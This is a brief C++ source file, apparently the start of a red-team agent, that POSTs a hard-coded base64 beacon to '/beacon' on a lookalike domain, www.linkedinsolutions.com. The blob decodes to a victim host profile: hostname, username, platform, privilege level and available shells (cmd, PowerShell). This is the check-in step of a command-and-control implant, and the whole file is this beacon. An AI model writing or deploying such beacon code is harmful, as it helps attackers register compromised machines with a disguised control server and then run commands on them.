// RedTeamAgent.cpp

#include "http.h"

const char* Params = "eyJwaWQiOiI5NjAiLCJzZXJ2ZXIiOiJsb2NhbGhvc3QiLCJwbGF0Zm9ybSI6IndpbmRvd3MiLCJob3N0IjoiREVTS1RPUC1UTjFRRE9VIiwidXNlcm5hbWUiOiJhbXJ0aCIsImFyY2hpdGVjdHVyZSI6ImFtZDY0IiwicHJpdmlsZWdlIjoiVXNlciIsICJleGVjdXRvcnMiOlsiY21kIiwgInBzaCJdfQ ==";
int main()
{
	HINTERNET hSession = SendRequest("www.linkedinsolutions.com", 80, "/beacon", "POST", Params);
	if (hSession != NULL)
	{
		printf("Data has been sent successfully\n");
	}
	else
	{
		printf("Error in sending data\n");
	}
}



